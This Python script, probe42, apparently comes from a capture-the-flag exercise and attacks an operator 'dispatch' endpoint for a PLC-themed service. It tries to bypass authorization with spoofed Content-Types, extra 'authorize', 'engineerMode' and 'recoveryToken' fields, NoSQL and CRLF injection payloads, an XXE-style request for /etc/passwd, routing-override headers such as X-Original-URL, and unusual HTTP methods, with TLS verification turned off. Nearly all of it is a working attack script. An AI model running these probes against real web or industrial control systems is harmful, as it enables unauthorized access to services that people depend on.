#!/usr/bin/env python3
"""
probe42: dispatch with various Content-Types + tricky body shapes + non-standard headers.
"""
import json
import ssl
import time
import urllib.request
import urllib.error

HOST = "funicular-gm2cxozn.alfactf.ru"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def call(method, path, body=None, headers=None):
    url = f"https://{HOST}{path}"
    data = body.encode() if isinstance(body, str) else body
    req_headers = {"User-Agent": "p42"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=15) as resp:
            d = resp.read()
            return resp.status, dict(resp.headers), d, time.time() - t0
    except urllib.error.HTTPError as e:
        try:
            d = e.read()
        except Exception:
            d = b""
        return e.code, dict(e.headers), d, time.time() - t0
    except Exception as e:
        return -1, {}, str(e).encode(), time.time() - t0


PATH = "/api/operator/dispatch"
BASE_BODY = '{"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"ОП-3 / верхняя станция"}'

print("# baseline")
st, h, b, dt = call("POST", PATH, BASE_BODY, {"Content-Type": "application/json"})
print(f"  st={st} dt={dt:.2f}s body={b[:80]!r}")

print("\n# Various Content-Types with JSON body")
CTS = [
    "application/json",
    "application/json; charset=utf-8",
    "text/json",
    "text/plain",
    "text/plain; charset=utf-8",
    "text/x-component",
    "application/octet-stream",
    "application/xml",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "",
]
for ct in CTS:
    hdrs = {"Content-Type": ct} if ct else {}
    st, h, b, dt = call("POST", PATH, BASE_BODY, hdrs)
    print(f"  ct={ct:40s} st={st} dt={dt:.2f}s body={b[:80]!r}")
    time.sleep(0.3)

print("\n# Tricky body shapes (json, application/json)")
BODIES = [
    # array operation
    '{"operation":["plc-sync","restore"],"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}',
    # null packet
    '{"operation":"plc-sync","packet":null,"workOrder":"WO-17-04","terminal":"OP-3"}',
    # arrays as values
    '{"operation":"plc-sync","packet":["south-line.2026-03-27"],"workOrder":["WO-17-04"],"terminal":["OP-3"]}',
    # extra fields
    '{"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","authorize":true,"engineerMode":true,"recoveryToken":"valid"}',
    # bypass attempt with confirm in dispatch
    '{"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3","confirm":true}',
    # operation as object
    '{"operation":{"name":"plc-sync","mode":"override"},"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}',
    # JSON-RPC style
    '{"jsonrpc":"2.0","method":"plc-sync","params":{"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"},"id":1}',
    # nested operation
    '[{"operation":"plc-sync","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}]',
    # NoSQL injection attempt
    '{"operation":{"$ne":null},"packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}',
    # very long packet
    '{"operation":"plc-sync","packet":"' + "A"*10000 + '","workOrder":"WO-17-04","terminal":"OP-3"}',
    # CRLF injection
    '{"operation":"plc-sync\\r\\nX-Auth: yes","packet":"south-line.2026-03-27","workOrder":"WO-17-04","terminal":"OP-3"}',
    # XXE-like
    '{"operation":"plc-sync","packet":"&lt;!ENTITY a SYSTEM \\"file:///etc/passwd\\"&gt;","workOrder":"WO-17-04","terminal":"OP-3"}',
]
for body in BODIES:
    st, h, b, dt = call("POST", PATH, body, {"Content-Type": "application/json"})
    print(f"  body[:60]={body[:60]!r:60s} st={st} dt={dt:.2f}s body={b[:80]!r}")
    time.sleep(0.3)

print("\n# Try special headers known to bypass routing")
HEADER_VARIANTS = [
    {"X-HTTP-Method-Override": "PUT"},
    {"X-HTTP-Method-Override": "PATCH"},
    {"X-HTTP-Method-Override": "DEBUG"},
    {"X-Original-URL": "/api/operator/restore"},
    {"X-Rewrite-URL": "/api/operator/restore"},
    {"X-Forwarded-URI": "/api/operator/restore"},
    {"Host": "internal"},
    {"Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Service-Mode": "engineer"},
    {"X-Operator-Mode": "engineer"},
    {"X-PLC-Override": "1"},
    {"X-Recovery-Token": "1"},
    {"X-Authorization": "Bearer admin"},
    {"X-Auth-Token": "ok"},
]
for hv in HEADER_VARIANTS:
    hv2 = dict(hv); hv2["Content-Type"] = "application/json"
    st, h, b, dt = call("POST", PATH, BASE_BODY, hv2)
    print(f"  hdr={list(hv.items())[0]!r:60s} st={st} dt={dt:.2f}s body={b[:80]!r}")
    time.sleep(0.3)

print("\n# Methods")
for method in ["GET", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "DEBUG", "PROPFIND"]:
    st, h, b, dt = call(method, PATH, BASE_BODY, {"Content-Type": "application/json"})
    print(f"  {method:10s} st={st} dt={dt:.2f}s body={b[:80]!r}")
    time.sleep(0.3)

print("\n# done.")
